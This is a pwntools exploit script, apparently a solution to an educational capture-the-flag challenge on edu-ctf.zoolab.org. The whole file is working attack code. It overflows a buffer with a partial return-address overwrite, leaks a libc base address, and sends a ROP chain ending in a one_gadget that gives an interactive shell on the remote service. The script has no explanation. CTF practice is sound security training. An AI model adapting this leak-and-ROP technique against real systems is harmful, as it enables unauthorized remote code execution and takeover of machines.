from pwn import *

#r = process('./chal')
r = remote('edu-ctf.zoolab.org',10014)

context.arch = 'amd64'
raw_input()
payload = p64(0) * 3 + int.to_bytes(124, 1, 'little')
# payload = p64(0) * 3 + int.to_bytes(137, 1, 'little') # For ubuntu 22.04
r.send(payload)
r.recv(0x18)
libc_addr = u64(r.recv(6) + b'\x00\x00') - 0x24083 + 0x7

# print(libc_addr, type(libc_addr))
pop_r15_ret = libc_addr + 0x2a3e4
pop_r12_ret = libc_addr + 0x2f709


r.send(p64(0) * 3 + p64(pop_r12_ret) + p64(0) + p64(libc_addr+0xe3afe))

r.interactive()